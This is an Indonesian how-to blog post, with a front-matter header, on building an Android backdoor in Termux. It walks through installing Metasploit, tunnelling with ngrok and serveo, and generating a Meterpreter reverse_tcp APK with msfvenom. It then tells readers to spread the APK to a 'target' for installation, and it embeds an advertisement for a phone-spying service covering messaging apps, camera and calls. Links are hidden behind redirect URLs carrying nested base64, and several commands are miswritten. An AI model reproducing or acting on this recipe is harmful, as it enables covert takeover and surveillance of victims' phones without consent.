@@ -1,0 +1,172 @@
+﻿---
+link_referral:
+  - https://ac10tech.id/cara-buat-backdoor-metasploit-termux/
+draft: false
+toc: true
+preview: true
+author: Ayu Dewi
+lastmod: 2022-07-05T17:00:00+09:00
+title: Cara Bikin Backdoor Metasploit Termux
+date: 2024-02-17T18:50:09.701Z
+description: cara membuat backdoor menggunakan metasploit termux dengan ponsel
+  android tanpa harus melakukan rooting
+thumbnail: /uploads/media/backdoor-metasploit-termux-76.jpg
+tags:
+  - sadap
+categories:
+  - penyadap
+authors:
+  - Budiono Pasaribu
+---
+![backdoor termux](/uploads/media/backdoor-metasploit-termux-76.jpg)
+
+**Cara Membuat Backdoor Metasploit di Termux** – Jika pengguna smartphone android mungkin kamu sudah tidak asing lagi dengan aplikasi Termux, aplikasi untuk baris perintah yang digunakan untuk sistem UNIX.
+
+Bagi kamu yang belum tau apa itu termux, merupakan aplikasi terminal berbasis Linux Debian yang bisa dioperasikan di android, karena memang berbasis operasi sistem yang sama.
+
+Aplikasi Termux bisa digunakan untuk berbagai hal, seperti untuk membuat backdoor langsung dari smartphone android.
+
+Dalam artikel ini, saya akan membahas cara pembuatan backdoor Termux menggunakan perintah-perintah khusus.
+
+<div class="qc-wrapper">
+  <div class="qc-card">
+    <div class="h2 qc-title">Aplikasi Pengawas HP Jarak Jauh?</div>
+    <p class="qc-subtitle">📱 Mendukung iPhone & Android</p>
+    <img
+      src="/images/sadap-phone.webp"
+      alt="Layanan Monitoring Perangkat"
+      class="qc-image"
+    />
+    <div class="qc-features">
+      <p>• 💬 Monitoring aktivitas aplikasi pesan (WhatsApp, Telegram, Line, Instagram, Facebook, Skype, Viber, Snapchat)</p>
+      <p>• 📷 Pemantauan kamera & layar dengan izin pemilik perangkat</p>
+      <p>• 📞 Riwayat panggilan telepon & akses galeri</p>
+    </div>
+    <p class="qc-note">
+      🔒 Penggunaan sah & dengan persetujuan pemilik perangkat
+    </p>
+    <a
+      href="https://wa.me/62812345678"
+      class="qc-button"
+    >
+      Hubungi via WhatsApp
+    </a>
+  </div>
+</div>
+
+## Backdoor Metasploit - Termux
+
+Anda ganti bagian “**\*\*ac10\*\***” yang nantinya akan menjadi host Anda. Sedangkan local port bisa diubah dengan 4 angka lain.
+
+Cara membuat Backdoor Metasploit di Termux
+
+1. Pertama, kamu pastinya harus memiliki aplikasi Termux di android kamu, jika belum punya kamu bisa download aplikasi Termux dulu di Play Store atau link yang sudah disediakan.
+
+* [Download Termux Terbaru](https://play.google.com/store/apps/details?id=com.termux&hl=en&gl=US)
+* [Download Termux Versi Lama](https://f-droid.org/id/packages/com.termux/)
+
+2. Langsung install saja aplikasi Termux yang sudah kamu download di hp android kamu seperti install aplikasi android seperti biasanya.
+
+## Install Metasploit Termux
+
+3. Buka aplikasi Termux dan masukan kode perintah seperti di bawah ini:
+
+`Pkg install upgrade`
+
+`Pkg install git`
+
+`Git clone  [https://github.com/Hax4us/Metasploit_termux](https://trikwiki.com/best-cloud-hosting-providers/?url=aHR0cHM6Ly90cmlrd2lraS5jb20vZXhjZWxsZW50LWlkZWFzLWFuZC1leGFtcGxlcy1vZi1zYWFzLXN0YXJ0dXBzLz91cmw9YUhSMGNITTZMeTltZVhCemJtRndMbU52YlM5aVlYTnBZeTFtYVc1aGJtTnBZV3d0WVc1aGJIbDBhV056TFhSdkxYQnlaV1JwWTNRdGRHaGxMV1oxZEhWeVpTMTBjbVZ1WkhNdlAzVnliRDFoU0ZJd1kwaE5Oa3g1T1c1aFdGSnZaRmRKZFZreU9YUk1NR2hvWlVSU01XTjVPVTVhV0ZKb1l6TkNjMkl5YkRCWU0xSnNZMjB4TVdWQlBUMD0=)`
+
+## Cara Menjalankan Metasploit Termux
+
+4. Untuk bisa menjalankan metasploit di aplikasi Termux, maka kamu perlu masukan kode perintah di bawah ini:
+
+`ls`
+
+`cd Metasploit_termux`
+
+`chmod + x metasploit.sh`
+
+`./metasploit.sh`
+
+5. Tunggu beberapa saat hingga proses instalasi selesai dan lanjutkan dengan buka session baru di aplikasi Termux kamu dan masukan perintah di bawah ini:
+
+`cd`
+
+## Hubungkan Backdoor ke Ngrok
+
+6. Hubungkan backdoor ke Ngrok dan ketikan kode perintah di bawah ini:
+
+`Wget  [https://bin.equinox.io/c/4VmDzA7iaHb/_ngrok_-_stable_-_linux_-_arm_._zip_](https://trikwiki.com/excellent-ideas-and-examples-of-saas-startups/?url=aHR0cHM6Ly90cmlrd2lraS5jb20vZXhjZWxsZW50LWlkZWFzLWFuZC1leGFtcGxlcy1vZi1zYWFzLXN0YXJ0dXBzLz91cmw9YUhSMGNITTZMeTltZVhCemJtRndMbU52YlM5aVpXNWxabWwwY3kxdlppMW1hVzVoYm1OcFlXd3RkR1ZqYUc1dmJHOW5lUzgvZFhKc1BXRklVakJqU0UwMlRIazVhV0ZYTkhWYVdFWXhZVmMxZG1WRE5YQmllVGxxVEhwU1YySlZValpSVkdSd1dWVm9hVXd5Tlc1amJUbHlURmhPTUZsWFNuTmFVekZ6WVZjMU1XVkRNV2hqYlRCMVpXMXNkdz09)`
+
+`Unzip ngrok-stable-linux-arm.zip`
+
+## Buat Akun Ngrok Termux
+
+7. Buka aplikasi browser yang ada di hp android kamu dan buka situs *ngrok.com*.
+8. Jika belum daftar, maka kamu bisa daftar dahulu dan buka dashboard ngrok, lalu salin kode perintah di nomor 3. Kurang lebih seperti ini  *$ ./ngrok authoken 89TLxPaUgR5AP*.
+9. Pastekan kode yang sudah kamu salin tadi ke aplikasi  Termux kamu dilanjutkan dengan memasukan kode perintah di bawah ini:
+
+`./ngrok tcp 1337`
+
+10. Agar login bisa terhubung, maka kamu bisa gunakan VPN dengan menggunakan aplikasi VPN seperti Super VPN, HMAVPN, atau lainnya. atau tanpa aplikasi.
+11. Buka new session lagi atau tab baru pada termux dan masukan kode perintah di bawah ini:
+
+`Termux-setup-storage`
+
+`Msfvenom –p android/meterpreter/reverse_tcp  
+LHOST=0.tcp.ngrok.io LPORT=(port) R> /sdcard/backdoor.apk`
+
+Pada LPORT kamu isi sesuai dengan port yang ada di bagian samping ***0.tcp.ngrok.io***.
+
+12. Tunggu hingga proses sampai selesai.
+13. Jika proses sudah selesai, maka kamu tinggal sebar aplikasinya ke target supaya target install aplikasi tersebut di hp android miliknya.
+
+Perlu diingat, sebelum target memasang backdoor, Anda tidak boleh close aplikasi Termux agar tidak kehilangan akses.
+
+Untuk mengatasi hal tersebut Anda bisa install serveo di  Termux Anda.
+
+## Install Serveo Termux
+
+Berikut langkah menginstall serveo:
+
+`$ pkg install openssh`
+
+Untuk mengoperasikan seveo gunakan perintah:
+
+`$ ssh-R 80:localhost:8888 serveo.net`
+
+Bagian “**80**” merupakan port forwarding, sedangkan “**8888**” adalah local port.
+
+Nantinya Anda akan mendapat respon seperti:
+
+*“hi there forwarding HTTP traffic from https://random.serveo.net press g to start a GUI session and ctrl-c to quit”*
+
+Itu artinya proses install serveo sudah selesai, dan bisa langsung Anda gunakan.
+
+Sekarang perlu tau cara agar bisa kembali terhubung ke serveo.
+
+## Cara Kembali Terhubung Serveo
+
+Silahkan ganti perintah:
+
+`$ ssh –R 80:localhost:80 serveo.net`
+
+menjadi,
+
+`$ ssh –R ac10:localhost:80 serveo.net`
+
+Lalu ganti bagian “**\*\*ac10\*\***” yang nantinya akan menjadi host. Sedangkan local port bisa ubah dengan 4 angka lain.
+
+Cara Membuat Backdoor Menggunakan Metasploit di  Termux
+
+## Kesimpulan
+
+Nah, itu dia cara untuk membuat backdoor menggunakan di aplikasi Termux dengan cara yang mudah dan juga sederhana.
+
+Cara di atas juga sudah cukup popular digunakan oleh para pengguna hp android untuk membuat backdoor di aplikasi Termux mereka.
+
+Semoga cara buat ***backdoor metasploit*** di termux di atas bisa bermanfaat dan menjadi referensi untuk kamu yang ingin membuat backdor di hp android.
+
+Terima kasih.
+
